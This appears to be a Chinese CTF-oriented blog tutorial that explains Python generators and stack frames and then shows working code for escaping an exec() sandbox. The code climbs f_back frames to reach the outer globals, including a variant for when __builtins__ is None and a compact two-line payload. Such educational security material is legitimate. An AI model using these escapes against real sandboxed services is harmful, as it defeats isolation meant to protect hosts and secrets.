
# 前言


以前在一些大型比赛就遇到这种题，一直没时间去研究，现在康复训练下:)


# 生成器介绍


生成器（Generator）是Python中一种特殊的迭代器，它可以在迭代过程中动态生成值，而不需要一次性将所有值存储在内存中。


## Simple Demo


这里定义一个生成器函数， 生成器使用`yield`语句来产生值，每次调用生成器的`next()`方法时，生成器会执行直到遇到下一个`yield`语句为止，然后返回`yield`语句后面的值，也就是`a`的值



```
def f():
    a = 1
    while True:
        yield a
        a+=1
f = f()
print(next(f))  # 1
print(next(f))  # 2

```

也可以遍历获取所有的自增值



```
def f():
    a = 1
    for i in range(1, 100):
        yield a
        a+=1
f = f()
for value in f:
    print(value)

```

## 生成器表达式


生成器表达式是一种在 Python 中创建生成器的紧凑形式。类似于列表推导式，生成器表达式允许你使用简洁的语法来定义生成器，而不必显式地编写一个函数。生成器表达式的语法与列表推导式类似，但是使用圆括号而不是方括号。生成器表达式会逐个生成值，而不是一次性生成整个序列。这有利于提高内存的利用率



```
f = (i+1 for i in range(100))
# 可以用next一步步获取值
print(next(f))
# 也可以遍历的形式获取全部值
for value in f:
    print(value)

```

## 生成器属性


`gi_code`: 生成器对应的code对象。
`gi_frame`: 生成器对应的frame（栈帧）对象。
`gi_running`: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。
`gi_yieldfrom`：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。
`gi_frame.f_locals`：一个字典，包含生成器当前帧的本地变量。


## gi\_frame使用


`gi_frame` 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息。



```
def my_generator():
    yield 1
    yield 2
    yield 3

gen = my_generator()

# 获取生成器的当前帧信息
frame = gen.gi_frame

# 输出生成器的当前帧信息
print("Local Variables:", frame.f_locals)
print("Global Variables:", frame.f_globals)
print("Code Object:", frame.f_code)
print("Instruction Pointer:", frame.f_lasti)

```

以上例子展示了如何获取生成器的帧信息


## 栈帧(frame)介绍


在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。（跟c/c\+\+中的栈类似，懂点逆向知识应该很好理解）


栈帧包含了以下几个重要的属性：
`f_locals`: 一个字典，包含了函数或方法的局部变量。键是变量名。
`f_globals`: 一个字典，包含了函数或方法所在模块的全局变量。
`f_code`: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。
`f_lasti`: 整数，表示最后执行的字节码指令的索引。
`f_back`: 指向上一级调用栈帧的引用，用于构建调用栈。


# 利用栈帧(frame)逃逸沙箱


原理就是通过生成器的栈帧对象通过f\_back（返回前一帧）从而逃逸出去获取globals符号表，例如：



```
key = "this is flag"
codes='''
def waff():
    def f():
        yield g.gi_frame.f_back
    g = f()  #生成器
    frame = next(g) #获取到生成器的栈帧对象
    b = frame.f_back.f_back.f_globals['key'] #返回并获取前一级栈帧的globals
    return b
b=waff()
'''
locals={}
code = compile(codes, "", "exec")
exec(code, locals, None)
print(locals["b"])  # this is flag

```

逃逸出来我们就可以调用沙箱外的方法来执行恶意命令了


## globals中的\_\_builtins\_\_字段


`__builtins__` 模块是 Python 解释器启动时自动加载的，其中包含了一系列内置函数、异常和其他内置对象。


当代码这么设计时：



```
key = "this is flag"
codes='''
def waff():
    def f():
        yield g.gi_frame.f_back
    g = f()  #生成器
    frame = next(g) #获取到生成器的栈帧对象
    b = frame.f_back.f_back.f_globals['key'] #返回并获取前一级栈帧的globals
    return b
b=waff()
'''
locals={"__builtins__": None}
code = compile(codes, "", "exec")
exec(code, locals, None)
print(locals["b"])

```

这里将沙箱中的`__builtins__`置为空，也就是说沙箱中不能调用内置方法了，那我们这段代码运行就会报错了(next方法不能使用)，那么该如何代替next方法来拿到生成器的值，还记得上面说可以遍历的形式来获取生成器的值：



```
key = "this is flag"
codes='''
def waff():
    def f():
        yield g.gi_frame.f_back
    g = f()  #生成器
    frame = [i for i in g][0] #获取到生成器的栈帧对象
    b = frame.f_back.f_back.f_back.f_globals['key'] #返回并获取前一级栈帧的globals
    return b
b=waff()
'''
locals={"__builtins__": None}
code = compile(codes, "", "exec")
exec(code, locals, None)
print(locals["b"])

```

这样可以成功拿到key的值，不过这里需要注意的是在给`b`赋值时，多加了一个`f_back`，因为我们用这种列表推导式拿到生成器的值，它的code对象是不同的：



```
frame = next(g)
0x00000235C9718440, file '', line 7, code waff>

frame = [i for i in g][0]
0x000002708F2ED8C0, file '', line 9, code >

```

列表推到式拿到的生成器的code对象是`listcomp`，所以我们还得拿上一个栈帧，所以需要再`f_back`一下


# 一些简便写法


例如：



```
q = (q.gi_frame.f_back.f_back.f_globals for _ in [1])
g = [*q][0]

```

* 第一行生成器创建时，并不会直接执行，只是存储在内存中。
* 第二行对生成器解包，解包的同时会触发生成器调用，此时才开始执行q.gi\_frame.f\_back.f\_back.f\_globals。
* exec调用时，创建一个新栈帧；生成器q被执行时，又创建一个新栈帧。所以当我们拿到q.gi\_frame时，需要回溯两次才到达exec之外。
* 再拿一个f\_globals，就得到了沙箱外的的globals


  * [前言](#%E5%89%8D%E8%A8%80)
* [生成器介绍](#%E7%94%9F%E6%88%90%E5%99%A8%E4%BB%8B%E7%BB%8D)
* [Simple Demo](#simple-demo)
* [生成器表达式](#%E7%94%9F%E6%88%90%E5%99%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F)
* [生成器属性](#%E7%94%9F%E6%88%90%E5%99%A8%E5%B1%9E%E6%80%A7)
* [gi\_frame使用](#gi_frame%E4%BD%BF%E7%94%A8)
* [栈帧(frame)介绍](#%E6%A0%88%E5%B8%A7frame%E4%BB%8B%E7%BB%8D)
* [利用栈帧(frame)逃逸沙箱](#%E5%88%A9%E7%94%A8%E6%A0%88%E5%B8%A7frame%E9%80%83%E9%80%B8%E6%B2%99%E7%AE%B1):[veee加速器](https://liuyunzhuge.com)
* [globals中的\_\_builtins\_\_字段](#globals%E4%B8%AD%E7%9A%84__builtins__%E5%AD%97%E6%AE%B5)
* [一些简便写法](#%E4%B8%80%E4%BA%9B%E7%AE%80%E4%BE%BF%E5%86%99%E6%B3%95)

   \_\_EOF\_\_

   F12  - **本文链接：** [https://github.com/F12\-blog/p/18502707](https://github.com)
 - **关于博主：** 评论和私信会在第一时间回复。或者[直接私信](https://github.com)我。
 - **版权声明：** 本博客所有文章除特别声明外，均采用 [BY\-NC\-SA](https://github.com "BY-NC-SA") 许可协议。转载请注明出处！
 - **声援博主：** 如果您觉得文章对您有帮助，可以点击文章右下角**【[推荐](javascript:void(0);)】**一下。
     
